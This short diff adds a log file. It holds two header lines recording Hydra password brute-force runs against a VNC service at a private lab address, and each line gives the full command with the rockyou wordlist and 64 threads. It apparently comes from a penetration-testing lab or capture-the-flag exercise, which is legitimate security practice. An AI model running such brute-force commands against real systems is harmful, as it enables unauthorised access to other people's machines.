@@ -1,0 +1,2 @@
+# Hydra v9.4 run at 2022-12-07 00:49:51 on 10.10.9.190 vnc (hydra -P /usr/share/wordlists/rockyou.txt.gz -f -o hydraresult.txt -t 64 -I vnc://10.10.9.190)
+# Hydra v9.4 run at 2022-12-07 00:50:42 on 10.10.9.190 vnc (hydra -P /usr/share/wordlists/rockyou.txt -f -o hydraresult.txt -t 64 -I vnc://10.10.9.190)
